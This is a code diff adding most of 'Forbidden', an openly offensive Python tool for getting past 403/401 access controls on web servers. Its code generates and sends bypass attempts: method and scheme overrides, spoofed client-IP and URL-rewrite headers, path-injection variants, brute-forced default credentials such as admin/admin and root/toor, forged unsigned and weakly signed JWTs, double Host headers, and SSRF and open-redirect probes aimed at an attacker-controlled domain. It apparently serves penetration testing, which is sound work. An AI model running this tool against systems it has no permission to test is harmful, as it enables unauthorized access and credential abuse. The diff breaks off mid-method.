+	def __send_request(self, record, passthrough = False):
+		if self.__sleep:
+			time.sleep(self.__sleep)
+		session = None
+		response = None
+		try:
+			# --------------------------------
+			session = requests.Session()
+			session.max_redirects = self.__max_redirects
+			# --------------------------------
+			session.cookies.clear()
+			# --------------------------------
+			request = requests.Request(
+				record["method"],
+				record["url"]
+			)
+			if record["agent"]:
+				request.headers["User-Agent"] = self.__encode(record["agent"])
+			if record["headers"]:
+				self.__set_double_headers(request, record["headers"]) # Will override 'User-Agent' HTTP request header.
+			if record["body"]:
+				request.data = record["body"]
+			if record["proxy"]:
+				session.proxies["https"] = session.proxies["http"] = record["proxy"]
+			# --------------------------------
+			prepared = session.prepare_request(request)
+			prepared.url = record["url"]
+			# --------------------------------
+			response = session.send(
+				prepared,
+				verify = self.__verify,
+				allow_redirects = self.__allow_redirects,
+				timeout = (self.__connect_timeout, self.__read_timeout)
+			)
+			# --------------------------------
+			record["code"] = int(response.status_code)
+			record["length"] = len(response.content)
+			if passthrough:
+				record["response_headers"] = dict(response.headers)
+				# record["response"] = self.__decode(response.content)
+			elif record["length"] in self.__lengths or (self.__ignore and re.search(self.__ignore, self.__decode(response.content), self.__regex_flags)):
+				record["code"] = -1
+			# --------------------------------
+		except (requests.packages.urllib3.exceptions.LocationParseError, requests.exceptions.RequestException) as ex:
+			# --------------------------------
+			self.__print_debug(ex, ("{0}: {1}").format(record["id"], record["command"]))
+			# --------------------------------
+		finally:
+			# --------------------------------
+			if response:
+				response.close()
+			# --------------------------------
+			if session:
+				session.close()
+			# --------------------------------
+		return record
+
+	def __set_double_headers(self, request, headers):
+		exists = set()
+		for header in headers:
+			array = header.split(":", 1)
+			key = array[0].rstrip(";")
+			value = self.__encode(array[1].strip() if len(array) > 1 else "")
+			request.headers[key if key not in exists and not exists.add(key) else uniquestr(key)] = value
+
+	def __validate_results(self):
+		tmp = []
+		# --------------------------------
+		print_time("Validating results...")
+		table = Table(self.__collection) # unfiltered
+		# --------------------------------
+		self.__collection = pop(sorted([record for record in self.__collection if record["code"] > 0], key = lambda x: (x["code"], -x["length"], x["raw"])), ["raw", "proxy", "response_headers", "response", "curl"])
+		# --------------------------------
+		for record in self.__collection:
+			if record["code"] >= 500:
+				continue
+				print_cyan(jdump(record))
+				tmp.append(record)
+			elif record["code"] >= 400:
+				continue
+				print_red(jdump(record))
+				tmp.append(record)
+			elif record["code"] >= 300:
+				# continue
+				print_yellow(jdump(record))
+				tmp.append(record)
+			elif record["code"] >= 200:
+				# continue
+				print_green(jdump(record))
+				tmp.append(record)
+			elif record["code"] > 0:
+				continue
+				print_white(jdump(record))
+				tmp.append(record)
+		# --------------------------------
+		self.__collection = tmp
+		self.__total = len(self.__collection)
+		table.show()
+
+	def __check_tests(self, array):
+		return any(test in array for test in self.__tests)
+
+	def __prepare_collection(self):
+		print_time("Preparing test records...")
+		# --------------------------------
+		if self.__check_tests(["base", "all"]):
+			# NOTE: Test both, HTTP and HTTPS requests on both, domain name and IP.
+			self.__records(
+				identifier = "BASE-1",
+				urls       = unique([
+					self.__url["urls"]["domain"]["https"],
+					self.__url["urls"]["domain"]["http"],
+					self.__url["urls"]["ip"]["https"],
+					self.__url["urls"]["ip"]["http"]
+				])
+			)
+		# --------------------------------
+		if self.__check_tests(["methods", "all"]):
+			# NOTE: Test allowed HTTP methods.
+			self.__records(
+				identifier = "METHODS-1",
+				urls       = self.__url["urls"]["base"],
+				methods    = self.__allowed_methods
+			)
+			# NOTE: Test allowed HTTP methods with 'Content-Length: 0' HTTP request header.
+			self.__records(
+				identifier = "METHODS-2",
+				urls       = self.__url["urls"]["base"],
+				methods    = self.__allowed_methods,
+				headers    = ["Content-Length: 0"]
+			)
+			# NOTE: Test cross-site tracing (XST) with HTTP TRACE and TRACK methods.
+			# NOTE: To confirm the vulnerability, check if 'XSTH: XSTV' HTTP response header is returned.
+			self.__records(
+				identifier = "METHODS-3",
+				urls       = self.__url["urls"]["base"],
+				methods    = ["TRACE", "TRACK"],
+				headers    = ["XSTH: XSTV"]
+			)
+			# NOTE: Test [text] file upload with HTTP PUT method.
+			# NOTE: Semi-colon in 'Content-Type;' will expand to an empty HTTP request header.
+			self.__records(
+				identifier = "METHODS-4",
+				urls       = self.__get_file_upload_urls(files = ["/pentest.txt"]),
+				methods    = ["PUT"],
+				headers    = ["Content-Type;", "Content-Type: text/plain"],
+				body       = "pentest"
+			)
+		# --------------------------------
+		if self.__check_tests(["method-overrides", "all"]):
+			# NOTE: Test HTTP method overrides with HTTP request headers.
+			self.__records(
+				identifier = "METHOD-OVERRIDES-1",
+				urls       = self.__url["urls"]["base"],
+				methods    = self.__allowed_methods,
+				headers    = self.__get_method_override_headers()
+			)
+			# NOTE: Test HTTP method overrides with URL query string parameters.
+			self.__records(
+				identifier = "METHOD-OVERRIDES-2",
+				urls       = self.__get_method_override_urls(),
+				methods    = self.__allowed_methods
+			)
+		# --------------------------------
+		if self.__check_tests(["scheme-overrides", "all"]):
+			# NOTE: Test URL scheme overrides, HTTPS to HTTP.
+			self.__records(
+				identifier = "SCHEME-OVERRIDES-1",
+				urls       = self.__url["urls"]["domain"]["https"],
+				headers    = self.__get_scheme_override_headers("http")
+			)
+			# NOTE: Test URL scheme overrides, HTTP to HTTPS.
+			self.__records(
+				identifier = "SCHEME-OVERRIDES-2",
+				urls       = self.__url["urls"]["domain"]["http"],
+				headers    = self.__get_scheme_override_headers("https")
+			)
+		# --------------------------------
+		if self.__check_tests(["port-overrides", "all"]):
+			# NOTE: Test port overrides.
+			self.__records(
+				identifier = "PORT-OVERRIDES-1",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_port_override_headers()
+			)
+		# --------------------------------
+		if self.__check_tests(["headers", "all"]):
+			# NOTE: Test information disclosure with 'Accept' HTTP request header.
+			self.__records(
+				identifier = "HEADERS-1",
+				urls       = self.__url["urls"]["base"],
+				headers    = ["Accept: application/json,text/javascript,*/*;q=0.01"]
+			)
+			# NOTE: Test HTTP request headers.
+			self.__records(
+				identifier = "HEADERS-2",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_url_headers(self.__url["relative_paths"] + self.__url["absolute_paths"] + self.__get_all_values(scheme = True, ip = False))
+			)
+			# NOTE: Test HTTP request headers.
+			self.__records(
+				identifier = "HEADERS-3",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_ip_headers(self.__get_all_values(scheme = False, ip = False) + self.__get_all_values(scheme = False, ip = True))
+			)
+			# NOTE: Test HTTP request headers.
+			self.__records(
+				identifier = "HEADERS-4",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_special_headers()
+			)
+			# NOTE: Test HTTP request headers.
+			if self.__values:
+				self.__records(
+					identifier = "HEADERS-5",
+					urls       = self.__url["urls"]["base"],
+					headers    = self.__get_all_headers(self.__values)
+				)
+			# NOTE: Test URL override with domain name.
+			self.__records(
+				identifier = "HEADERS-6",
+				urls       = self.__url["scheme_domain"],
+				headers    = self.__get_url_headers(self.__url["relative_paths"] + self.__url["absolute_paths"])
+			)
+			# NOTE: Test URL override with accessible URL.
+			if self.__accessible:
+				self.__records(
+					identifier = "HEADERS-7",
+					urls       = self.__accessible,
+					headers    = self.__get_url_headers(self.__url["relative_paths"] + self.__url["absolute_paths"])
+				)
+			# NOTE: Test HTTP host override with double 'Host' HTTP request headers.
+			self.__records(
+				identifier = "HEADERS-8",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_double_host_header(ip = False) + self.__get_double_host_header(ip = True),
+				curl       = False
+			)
+		# --------------------------------
+		if self.__check_tests(["paths", "all"]):
+			# NOTE: Test URL path bypasses.
+			self.__records(
+				identifier = "PATHS-1",
+				urls       = self.__get_path_bypass_urls()
+			)
+		# --------------------------------
+		if self.__check_tests(["encodings", "all"]):
+			# NOTE: Test domain name and URL path transformations and encodings.
+			self.__records(
+				identifier = "ENCODINGS-1",
+				urls       = self.__get_encoded_urls(),
+				curl       = True
+			)
+			# TO DO: Extend to HTTP request headers.
+		# --------------------------------
+		if self.__check_tests(["auths", "all"]):
+			# NOTE: Test basic authentication/authorization.
+			self.__records(
+				identifier = "AUTHS-1",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_basic_auth_headers()
+			)
+			# NOTE: Test bearer authentication/authorization.
+			self.__records(
+				identifier = "AUTHS-2",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_bearer_auth_headers()
+			)
+		# --------------------------------
+		if self.__check_tests(["redirects", "all"]):
+			# NOTE: Test open redirects and server-side request forgery (SSRF).
+			self.__records(
+				identifier = "REDIRECTS-1",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_url_headers(self.__get_redirect_urls(scheme = True, ip = False))
+			)
+			# NOTE: Test open redirects and server-side request forgery (SSRF).
+			self.__records(
+				identifier = "REDIRECTS-2",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_ip_headers(self.__get_redirect_urls(scheme = False, ip = False) + self.__get_redirect_urls(scheme = False, ip = True))
+			)
+		# --------------------------------
+		if self.__check_tests(["parsers", "all"]):
+			# NOTE: Test broken URL parsers and server-side request forgery (SSRF).
+			self.__records(
+				identifier = "PARSERS-1",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_url_headers(self.__get_broken_urls(scheme = True, ip = False))
+			)
+			# NOTE: Test broken URL parsers and server-side request forgery (SSRF).
+			self.__records(
+				identifier = "PARSERS-2",
+				urls       = self.__url["urls"]["base"],
+				headers    = self.__get_ip_headers(self.__get_broken_urls(scheme = False, ip = False) + self.__get_broken_urls(scheme = False, ip = True))
+			)
+
+	def __get_methods(self):
+		tmp = [
+			"ACL",
+			"ARBITRARY",
+			"BASELINE-CONTROL",
+			"BIND",
+			"CHECKIN",
+			"CHECKOUT",
+			"CONNECT",
+			"COPY",
+			# "DELETE", # NOTE: This HTTP method is dangerous!
+			"GET",
+			"HEAD",
+			"INDEX",
+			"LABEL",
+			"LINK",
+			"LOCK",
+			"MERGE",
+			"MKACTIVITY",
+			"MKCALENDAR",
+			"MKCOL",
+			"MKREDIRECTREF",
+			"MKWORKSPACE",
+			"MOVE",
+			"OPTIONS",
+			"ORDERPATCH",
+			"PATCH",
+			"POST",
+			"PRI",
+			"PROPFIND",
+			"PROPPATCH",
+			"PUT",
+			"REBIND",
+			"REPORT",
+			"SEARCH",
+			"SHOWMETHOD",
+			"SPACEJUMP",
+			"TEXTSEARCH",
+			"TRACE",
+			"TRACK",
+			"UNBIND",
+			"UNCHECKOUT",
+			"UNLINK",
+			"UNLOCK",
+			"UPDATE",
+			"UPDATEREDIRECTREF",
+			"VERSION-CONTROL"
+		]
+		return unique(tmp)
+
+	def __get_file_upload_urls(self, files):
+		tmp = []
+		scheme_domain_paths = append_paths(self.__url["scheme_domain"], get_recursive_paths(self.__url["path"]))
+		scheme_domain_path_files = append_paths(scheme_domain_paths, files)
+		for scheme_domain_path_file in scheme_domain_path_files:
+			tmp.append(scheme_domain_path_file + self.__url["query"]["full"] + self.__url["fragment"]["full"])
+		return unique(tmp)
+
+	def __get_method_override_headers(self):
+		tmp = []
+		headers = [
+			"X-HTTP-Method",
+			"X-HTTP-Method-Override",
+			"X-Method-Override"
+		]
+		for header in headers:
+			for method in self.__get_methods():
+				tmp.append(("{0}: {1}").format(header, method))
+		return unique(tmp)
+
+	def __get_method_override_urls(self):
+		tmp = []
+		parameters = [
+			"x-http-method-override",
+			"x-method-override"
+		]
+		for parameter in parameters:
+			url = copy.deepcopy(self.__url)
+			if parameter in url["query"]["parsed"]:
+				# NOTE: In case of duplicate parameters in the URL query string, replace only the last one.
+				# NOTE: URL query string is case-sensitive.
+				separator = "?"
+				for method in self.__get_methods():
+					url["query"]["parsed"][parameter][-1] = method
+					query = separator + urllib.parse.urlencode(url["query"]["parsed"], doseq = True)
+					tmp.append(url["scheme_domain"] + url["path"] + query + url["fragment"]["full"])
+			else:
+				separator = "&" if url["query"]["parsed"] else "?"
+				for method in self.__get_methods():
+					url["query"]["parsed"][parameter] = [method]
+					query = separator + urllib.parse.urlencode(url["query"]["parsed"], doseq = True)
+					tmp.append(url["scheme_domain"] + url["path"] + query + url["fragment"]["full"])
+		return unique(tmp)
+
+	def __get_scheme_override_headers(self, scheme):
+		tmp = []
+		# --------------------------------
+		headers = [
+			"X-Forwarded-Proto",
+			"X-Forwarded-Protocol",
+			"X-Forwarded-Scheme",
+			"X-Scheme",
+			"X-URL-Scheme"
+		]
+		for header in headers:
+			tmp.append(("{0}: {1}").format(header, scheme))
+		# --------------------------------
+		headers = [
+			"Front-End-HTTPS",
+			"X-Forwarded-SSL"
+		]
+		status = "on" if scheme == "https" else "off"
+		for header in headers:
+			tmp.append(("{0}: {1}").format(header, status))
+		# --------------------------------
+		return unique(tmp)
+
+	def __get_port_override_headers(self):
+		tmp = []
+		headers = [
+			"X-Forwarded-Port"
+		]
+		for header in headers:
+			for port in [self.__url["port"], 80, 443, 4443, 8008, 8080, 8403, 8443, 9008, 9080, 9403, 9443]:
+				tmp.append(("{0}: {1}").format(header, port))
+		return unique(tmp)
+
+	def __get_url_headers(self, values):
+		tmp = []
+		# --------------------------------
+		headers = [
+			"19-Profile",
+			"Base-URL",
+			"Destination",
+			"Origin",
+			"Profile",
+			"Proxy",
+			"Referer",
+			"Request-URI",
+			"URI",
+			"URL",
+			"WAP-Profile",
+			"X-Forwarded-Path",
+			"X-HTTP-DestinationURL",
+			"X-Original-URL",
+			"X-Override-URL",
+			"X-Proxy-URL",
+			"X-Referer",
+			"X-Rewrite-URL",
+			"X-Wap-Profile"
+		]
+		for header in headers:
+			for value in values:
+				tmp.append(("{0}: {1}").format(header, value))
+		# --------------------------------
+		return unique(tmp)
+
+	def __get_ip_headers(self, values):
+		tmp = []
+		# --------------------------------
+		headers = [
+			"CF-Connecting-IP",
+			"Client-IP",
+			"Cluster-Client-IP",
+			"Forwarded-For",
+			"Forwarded-For-IP",
+			"Host",
+			"Incap-Client-IP",
+			"Proxy",
+			"Redirect",
+			"Remote-Addr",
+			"True-Client-IP",
+			"X-Client-IP",
+			"X-Cluster-Client-IP",
+			"X-Forwarded",
+			"X-Forwarded-By",
+			"X-Forwarded-For",
+			"X-Forwarded-For-Original",
+			"X-Forwarded-Host",
+			"X-Forwarded-Server",
+			"X-HTTP-Host-Override",
+			"X-Host",
+			"X-Host-Override",
+			"X-Original-Forwarded-For",
+			"X-Original-Remote-Addr",
+			"X-Originally-Forwarded-For",
+			"X-Originating-IP",
+			"X-Proxy-Host",
+			"X-ProxyUser-IP",
+			"X-Real-IP",
+			"X-Remote-Addr",
+			"X-Remote-IP",
+			"X-Requested-With",
+			"X-Server-IP",
+			"X-True-Client-IP",
+			"X-True-IP"
+		]
+		for header in headers:
+			for value in values:
+				tmp.append(("{0}: {1}").format(header, value))
+		# --------------------------------
+		headers = [
+			"Forwarded"
+		]
+		for header in headers:
+			for value in values:
+				tmp.append(("{0}: for=\"{1}\"").format(header, value.replace("\"", "\\\"")))
+		# --------------------------------
+		headers = [
+			"X-Custom-IP-Authorization"
+		]
+		injections = ["", ";", ".;", "..;"]
+		for header in headers:
+			for value in values:
+				for injection in injections:
+					tmp.append(("{0}: {1}").format(header, value + injection))
+		# --------------------------------
+		headers = [
+			"X-Originating-IP"
+		]
+		for header in headers:
+			for value in values:
+				tmp.append(("{0}: [{1}]").format(header, value))
+		# --------------------------------
+		return unique(tmp)
+
+	def __get_special_headers(self):
+		tmp = []
+		# --------------------------------
+		headers = [
+			"From"
+		]
+		for header in headers:
+			for value in [self.__url["domain_no_port"], self.__evil["domain_no_port"]]:
+				tmp.append(("{0}: pentest@{1}").format(header, value))
+		# --------------------------------
+		headers = [
+			"Profile"
+		]
+		for header in headers:
+			for value in [self.__url["scheme_domain"], self.__evil["scheme_domain"]]:
+				tmp.append(("{0}: <{0}/profile/pentest>").format(header, value))
+		# --------------------------------
+		headers = [
+			"X-Requested-With"
+		]
+		for header in headers:
+			for value in ["XMLHttpRequest"]:
+				tmp.append(("{0}: {0}").format(header, value))
+		# --------------------------------
+		return unique(tmp)
+
+	def __get_all_headers(self, values):
+		return unique(self.__get_url_headers(values) + self.__get_ip_headers(values))
+
+	def __get_localhost_urls(self):
+		return get_all_domains(self.__url["scheme"], ["localhost", "127.0.0.1", unicode_encode("127.0.0.1"), "127.000.000.001"], self.__url["port"])
+
+	def __get_random_urls(self):
+		return get_all_domains(self.__url["scheme"], ["192.168.1.1", "172.16.1.1", "173.245.48.1", "10.1.1.1"], self.__url["port"])
+
+	def __get_all_values(self, scheme = True, ip = False):
+		tmp = []
+		domain_extended = "ip_extended" if ip else "domain_extended"
+		localhost = "127.0.0.1" if ip else "localhost"
+		temp = strip_url_schemes(self.__get_localhost_urls() + self.__get_random_urls() + self.__url[domain_extended])
+		if scheme:
+			tmp.extend([("{0}://{1}").format(self.__url["scheme"], entry + self.__url["path_full"]) for entry in temp])
+		else:
+			tmp += temp
+		temp = strip_url_schemes(self.__evil[domain_extended])
+		if scheme:
+			tmp.extend([("{0}://{1}").format(self.__evil["scheme"], entry + self.__url["path_full"]) for entry in temp])
+		else:
+			tmp += temp
+		if not scheme:
+			for override in strip_url_schemes(self.__url[domain_extended] + self.__evil[domain_extended]):
+				for initial in strip_url_schemes([localhost, ("{0}:{1}").format(localhost, self.__url["port"])]):
+					tmp.append(("{0},{1}").format(initial, override))
+		return unique(tmp)
+
+	def __get_double_host_header(self, ip = False):
+		tmp = []
+		domain_extended = "ip_extended" if ip else "domain_extended"
+		exists = set()
+		for override in strip_url_schemes(self.__evil[domain_extended]):
+			for initial in strip_url_schemes(self.__url[domain_extended]):
+				exist = initial + override
+				if exist not in exists and not exists.add(exist):
+					tmp.append([
+						("Host: {0}").format(initial),
+						("Host: {0}").format(override)
+					])
+		return tmp
+
+	def __get_path_bypass_urls(self):
+		path_bypasses = []
+		# --------------------------------
+		path = self.__url["path"].strip(fs_const)
+		# --------------------------------
+		# NOTE: Inject at the beginning, end, and both, beginning and end of the URL path.
+		# NOTE: All possible combinations.
+		injections = []
+		for i in ["", "%09", "%20", "%23", "%2e", "*", ".", "..", ";", ".;", "..;", ";foo=bar;"]:
+			injections.extend([fs_const + i + fs_const, i + fs_const, fs_const + i, i])
+		for i in injections:
+			path_bypasses.extend([path + i, i + path])
+			if path:
+				for j in injections:
+					path_bypasses.extend([i + path + j])
+		# --------------------------------
+		# NOTE: Inject at the end of the URL path.
+		injections = []
+		for i in ["#", "*", ".", "?", "~"]:
+			injections.extend([i, i + i, ("{0}random").format(i)])
+		paths = [path, path + fs_const]
+		for p in paths:
+			for i in injections:
+				path_bypasses.extend([p + i])
+		# --------------------------------
+		# NOTE: Inject at the end of the URL path only if it does not end with forward slash.
+		if path and not self.__url["path"].endswith(fs_const):
+			injections = ["asp", "aspx", "esp", "html", "jhtml", "json", "jsp", "jspa", "jspx", "php", "sht", "shtml", "xhtml", "xml"]
+			for i in injections:
+				path_bypasses.extend([("{0}.{1}").format(path, i)])
+		# --------------------------------
+		tmp = []
+		for path_bypass in path_bypasses:
+			tmp.append(self.__url["scheme_domain"] + prepend_slash(path_bypass) + self.__url["query"]["full"] + self.__url["fragment"]["full"])
+		return unique(tmp)
+
+	def __get_encoded_urls(self):
+		tmp = []
+		domains = get_encoded_domains(self.__url["domain_no_port"], self.__url["port"])
+		for domain in domains:
+			tmp.append(("{0}://{1}").format(self.__url["scheme"], domain + self.__url["path_full"]))
+		if self.__url["path"]:
+			paths = get_encoded_paths(self.__url["path"])
+			for path in paths:
+				tmp.append(self.__url["scheme_domain"] + path + self.__url["query"]["full"] + self.__url["fragment"]["full"])
+			for domain in domains:
+				for path in paths:
+					tmp.append(("{0}://{1}").format(self.__url["scheme"], domain + path + self.__url["query"]["full"] + self.__url["fragment"]["full"]))
+		return unique(tmp)
+
+	def __get_basic_auth_headers(self):
+		tmp = []
+		headers = [
+			"Authorization"
+		]
+		values = ["", "null", "None", "nil"]
+		usernames = ["admin", "cisco", "gateway", "guest", "jigsaw", "root", "router", "switch", "tomcat", "wampp", "xampp", "sysadmin"]
+		passwords = ["admin", "cisco", "default", "gateway", "guest", "jigsaw", "password", "root", "router", "secret", "switch", "tomcat", "toor", "wampp", "xampp", "sysadmin"]
+		for username in usernames:
+			for password in passwords:
+				values.append(b64(("{0}:{1}").format(username, password)))
+		for header in headers:
+			for value in values:
+				tmp.append(("{0}: Basic {1}").format(header, value))
+		return unique(tmp)
+
+	def __get_bearer_auth_headers(self):
+		tmp = []
+		headers = [
+			"Authorization"
+		]
+		values = ["", "null", "None", "nil",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJhZG1pbiI6dHJ1ZX0.",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.eyJhZG1pbiI6dHJ1ZX0.",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.5kp9eqTFR4hoHAIvHXgXXnLE8aJUoJVS4AV4t7uO5eU",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.emvct89GULwEkl5Jur3Y2JADuP8piGzUxFG5mantrUU",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.ZvSy_JmkGvnKi908ZblUyq6mRPHgaiCs9n4o2N4Lp10",
+			"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.MAYCAQACAQA"
+		]
+		for url in [self.__url["scheme_domain"], self.__evil["scheme_domain"]]:
+			for secret in ["secret", b64("secret")]:
+				values.append(jwt.encode({"admin": True}, secret, algorithm = "HS256", headers = {"jku": url}))
+		for header in headers:
+			for value in values:
+				tmp.append(("{0}: Bearer {1}").format(header, value))
+		return unique(tmp)
+
+	def __get_redirect_urls(self, scheme = True, ip = False):
+		tmp = []
+		domain_extended = "ip_extended" if ip else "domain_extended"
+		domain_no_port = "ip_no_port" if ip else "domain_no_port"
+		injections = [fs_const, ("{0}.").format(fs_const)]
+		for override in strip_url_schemes(self.__evil[domain_extended]):
+			tmp.append(override)
+			for injection in injections:
+				tmp.append(override + injection + self.__url[domain_no_port])
+			if not ip:
+				tmp.append(("{0}.{1}").format(self.__url[domain_no_port], override))
+		if scheme:
+			tmp = [("{0}://{1}").format(self.__evil["scheme"], entry + self.__url["path_full"]) for entry in tmp]
+		return unique(tmp)
+
+	def __get_broken_urls(self, scheme = True, ip = False):
+		tmp = []
+		domain_extended = "ip_extended" if ip else "domain_extended"
+		at_const = "@"
+		injections = [at_const, (" {0}").format(at_const), ("#{0}").format(at_const)]
+		for override in strip_url_schemes(self.__evil[domain_extended]):
+			for initial in strip_url_schemes(self.__url[domain_extended]):
+				for injection in injections:
+					tmp.append(initial + injection + override)
+		if scheme:
+			tmp = [("{0}://{1}").format(self.__evil["scheme"], entry + self.__url["path_full"]) for entry in tmp]
+		return unique(tmp)
+
+# ----------------------------------------
+
+class Table:
+
+	def __init__(self, collection):
+		self.__table     = self.__init_table(collection)
+		self.__has_valid = any(code > 0 for code in self.__table)
+
+	def __init_table(self, collection):
+		table = {}
+		for record in collection:
+			if record["code"] not in table:
+				table[record["code"]] = 0
+			table[record["code"]] += 1
+		table = dict(sorted(table.items()))
+		return table
+
+	def __table_horizontal_border(self):
+		print_white("-" * 27)
+
+	def __format_row(self, key, value):
+		return ("| {0:<10} | {1:<10} |").format(key, value)
+
+	def show(self):
+		if self.__has_valid:
+			self.__table_horizontal_border()
+			print_white(self.__format_row("Code", "Count"))
+			self.__table_horizontal_border()
+			for code in self.__table:
+				if code >= 500:
+					print_cyan(self.__format_row(code, self.__table[code]))
+				elif code >= 400:
+					print_red(self.__format_row(code, self.__table[code]))
+				elif code >= 300:
+					print_yellow(self.__format_row(code, self.__table[code]))
+				elif code >= 200:
+					print_green(self.__format_row(code, self.__table[code]))
+				elif code > 0:
+					print_white(self.__format_row(code, self.__table[code]))
+		self.__table_horizontal_border()
+		if 0 in self.__table:
+			print_white(self.__format_row("Errors", self.__table[0]))
+			self.__table_horizontal_border()
+		if -1 in self.__table:
+			print_white(self.__format_row("Ignored", self.__table[-1]))
+			self.__table_horizontal_border()
+		if -2 in self.__table:
+			print_white(self.__format_row("Duplicates", self.__table[-2]))
+			self.__table_horizontal_border()
+
+# ----------------------------------------
 
 # my own validation algorithm
 
-proceed = True
+class Validate:
 
-def print_error(msg):
-	print(("ERROR: {0}").format(msg))
+	def __init__(self):
+		self.__proceed = True
+		self.__args    = {
+			"url"        : None,
+			"ignore_qsf" : None,
+			"ignore_curl": None,
+			"tests"      : None,
+			"force"      : None,
+			"values"     : None,
+			"path"       : None,
+			"evil"       : None,
+			"ignore"     : None,
+			"lengths"    : None,
+			"threads"    : None,
+			"sleep"      : None,
+			"agent"      : None,
+			"proxy"      : None,
+			"out"        : None,
+			"debug"      : None
+		}
 
-def error(msg, help = False):
-	global proceed
-	proceed = False
-	print_error(msg)
-	if help:
-		print("Use -h for basic and --help for advanced info")
+	def __basic(self):
+		self.__proceed = False
+		print("Forbidden v9.8 ( github.com/ivan-sincek/forbidden )")
+		print("")
+		print("Usage:   forbidden -u url                       -t tests [-f force] [-v values    ] [-p path ] [-o out         ]")
+		print("Example: forbidden -u https://example.com/admin -t all   [-f POST ] [-v values.txt] [-p /home] [-o results.json]")
 
-args = {"url": None, "tests": None, "force": None, "values": None, "path": None, "evil": None, "ignore": None, "lengths": None, "threads": None, "sleep": None, "agent": None, "proxy": None, "out": None, "debug": None}
+	def __advanced(self):
+		self.__basic()
+		print("")
+		print("DESCRIPTION")
+		print("    Bypass 4xx HTTP response status codes and more")
+		print("URL")
+		print("    Inaccessible URL")
+		print("    -u <url> - https://example.com/admin | etc.")
+		print("IGNORE QSF")
+		print("    Ignore URL query string and fragment")
+		print("    -iqsf <ignore-qsf> - yes")
+		print("IGNORE CURL")
+		print("    Use Python Requests instead of PycURL")
+		print("    -ic <ignore-curl> - yes")
+		print("TESTS")
+		print("    Tests to run")
+		print("    Use a comma-separated values")
+		print("    -t <tests> - base | methods | [method|scheme|port]-overrides | headers | paths | encodings | auths | redirects | parsers | all")
+		print("FORCE")
+		print("    Force an HTTP method for all non-specific test cases")
+		print("    -f <force> - GET | POST | CUSTOM | etc.")
+		print("VALUES")
+		print("    File with additional HTTP request header values such as internal IPs, etc.")
+		print("    Spacing will be stripped, empty lines ignored, and duplicates removed")
+		print("    Tests: headers")
+		print("    -v <values> - values.txt | etc.")
+		print("PATH")
+		print("    Accessible URL path to test URL overrides")
+		print("    Tests: headers")
+		print("    Default: /robots.txt | /index.html | sitemap.xml")
+		print("    -p <path> - /home | /README.txt | etc.")
+		print("EVIL")
+		print("    Evil URL to test URL overrides")
+		print("    Tests: headers | redirects")
+		print("    Default: https://github.com")
+		print("    -e <evil> - https://xyz.interact.sh | https://xyz.burpcollaborator.net | etc.")
+		print("IGNORE")
+		print("    Filter out 200 OK false positive results with RegEx")
+		print("    Spacing will be stripped")
+		print("    -i <ignore> - Inaccessible | \"Access Denied\" | etc.")
+		print("LENGTHS")
+		print("    Filter out 200 OK false positive results by HTTP response content lengths")
+		print("    Specify 'base' to ignore content length of the base HTTP response")
+		print("    Specify 'path' to ignore content length of the accessible URL response")
+		print("    Use comma-separated values")
+		print("    -l <lengths> - 12 | base | path | etc.")
+		print("THREADS")
+		print("    Number of parallel threads to run")
+		print("    More threads make it run faster but also might return more false positive results")
+		print("    Greatly impacted by internet connectivity speed and server capacity")
+		print("    Default: 5")
+		print("    -th <threads> - 20 | etc.")
+		print("SLEEP")
+		print("    Sleep in milliseconds before sending an HTTP request")
+		print("    Intended for a single-thread use")
+		print("    -s <sleep> - 500 | etc.")
+		print("AGENT")
+		print("    User agent to use")
+		print(("    Default: {0}").format(default_user_agent))
+		print("    -a <agent> - curl/3.30.1 | random[-all] | etc.")
+		print("PROXY")
+		print("    Web proxy to use")
+		print("    -x <proxy> - http://127.0.0.1:8080 | etc.")
+		print("OUT")
+		print("    Output file")
+		print("    -o <out> - results.json | etc.")
+		print("DEBUG")
+		print("    Debug output")
+		print("    -dbg <debug> - yes")
 
-# TO DO: Better URL validation. Validate "evil" and "proxy" URLs.
-def validate(key, value):
-	global args
-	value = value.strip()
-	if len(value) > 0:
-		if key == "-u" and args["url"] is None:
-			args["url"] = urllib.parse.urlparse(value)
-			if not args["url"].scheme:
-				error("URL scheme is required")
-			elif args["url"].scheme not in ["http", "https"]:
-				error("Supported URL schemes are 'http' and 'https'")
-			elif not args["url"].netloc:
-				error("Invalid domain name")
-			elif args["url"].port and (args["url"].port < 1 or args["url"].port > 65535):
-				error("Port number is out of range")
-		elif key == "-t" and args["tests"] is None:
-			args["tests"] = parse_tests(value.lower(), ["methods", "method-overrides", "scheme-overrides", "port-overrides", "headers", "paths", "encodings", "auths", "redirects", "parsers"], "all")
-			if not args["tests"]:
-				error("Supported tests are 'methods', '[method|scheme|port]-overrides', 'headers', 'paths', 'encodings', 'auths', 'redirects', 'parsers', or 'all'")
-		elif key == "-f" and args["force"] is None:
-			args["force"] = value.upper()
-		elif key == "-v" and args["values"] is None:
-			args["values"] = value
-			if not os.path.isfile(args["values"]):
-				error("File with additional values does not exists")
-			elif not os.access(args["values"], os.R_OK):
-				error("File with additional values does not have read permission")
-			elif not os.stat(args["values"]).st_size > 0:
-				error("File with additional values is empty")
+	def __print_error(self, msg):
